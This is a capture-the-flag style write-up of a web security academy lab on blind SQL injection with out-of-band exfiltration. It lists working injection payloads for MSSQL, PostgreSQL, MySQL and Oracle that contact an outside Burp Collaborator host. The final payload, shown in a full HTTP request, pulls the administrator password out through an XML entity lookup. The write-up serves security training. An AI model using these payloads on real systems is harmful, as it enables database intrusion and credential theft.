# Lab: Blind SQL injection with out-of-band data exfiltration
## Description

7z7fejdhsi0zvc9m8gvf36ummds3gs.burpcollaborator.net

1) Identify the out-of-band SQLi...

I first tried the previous attempt:
`'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % yyrcn SYSTEM "http://aaou2o2c1kd18cnsrylgpvk1dsjmia8ycm59vxk.burpcollab'||'orator.net/">%yyrcn;]>'),'/l') from dual)||'` which didn't work, so its most likely not Oracle this time.

I then started to work my way through the other DBMS.


## MSSQL
---
```
'foo'+'bar'  <-- how to concat
'+(PAYLOAD)+' <-- the structure
```
The payload
```
exec master..xp_dirtree '//7z7fejdhsi0zvc9m8gvf36ummds3gs.burpcollaborator.net/a'
```
The combo
```
'+(exec master..xp_dirtree '//7z7fejdhsi0zvc9m8gvf36ummds3gs.burpcollaborator.net/a')+'
```
---


## PostgreSQL
How to concat
```
'||(PAYLOAD)||'
```
The payload
```
copy (SELECT '') to program 'nslookup 7z7fejdhsi0zvc9m8gvf36ummds3gs.burpcollaborator.net'
```
The combo
```
'||(copy (SELECT '') to program 'nslookup 7z7fejdhsi0zvc9m8gvf36ummds3gs.burpcollaborator.net')||'
```


## MySQL
---
How to concat 
```
'foo' 'bar' [Note the space between the two strings]
CONCAT('foo','bar')

' '(PAYLOAD)' '
' CONCAT((PAYLOAD),'bar') '
```
The payload
```
LOAD_FILE('\\\\7z7fejdhsi0zvc9m8gvf36ummds3gs.burpcollaborator.net\\a')

SELECT * INTO OUTFILE '\\\\7z7fejdhsi0zvc9m8gvf36ummds3gs.burpcollaborator.net\a'
```
The combos
```
BAH; this became too complicated :)
```
---

Launched the Burp Scanner. That resulted in the following SQLi:
```
'%7c%7c(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20ugisq%20SYSTEM%20%22http%3a%2f%2fl0m5szsnrv3cynd3h9brf6ac339x8lz93xwkm8b.burpcollab'%7c%7c'orator.net%2f%22%3e%25ugisq%3b]%3e')%2c'%2fl')%20from%20dual)%7c%7c'
```
Decoded

`'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % ugisq SYSTEM "http://l0m5szsnrv3cynd3h9brf6ac339x8lz93xwkm8b.burpcollab'||'orator.net/">%ugisq;]>'),'/l') from dual)||'`

Very similar to the previous exercise, but with one important difference. The use of multiple concatenations. Why? Turns out, not apparent reason. We can simply remove it:

`'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % ugisq SYSTEM "http://l0m5szsnrv3cynd3h9brf6ac339x8lz93xwkm8b.burpcollaborator.net/">%ugisq;]>'),'/l') from dual)||'`

Now we need to extract some data. The select query `SELECT password FROM users WHERE username = 'administrator'` will be added into the existing payload and BINGO!!


## Solution
`'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % ugisq SYSTEM "http://sgc0v4u293hkcxq7p1c0krb73y9pxe.burpcollaborator.net/'||(SELECT password FROM users WHERE username = 'administrator')||'">%ugisq;]>'),'/l') from dual)||'`


```
GET /filter?category=Pets HTTP/1.1
Host: ac1b1f921e84ce2ec0a80908008300f8.web-security-academy.net
Cookie: TrackingId=3M9AeHSAXUUhosC3'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % ugisq SYSTEM "http://sgc0v4u293hkcxq7p1c0krb73y9pxe.burpcollaborator.net/'||(SELECT password FROM users WHERE username = 'administrator')||'">%ugisq;]>'),'/l') from dual)||'; session=O3OQvgXgTjwC9uAvlIWMpIHgT4vrRV7f
```
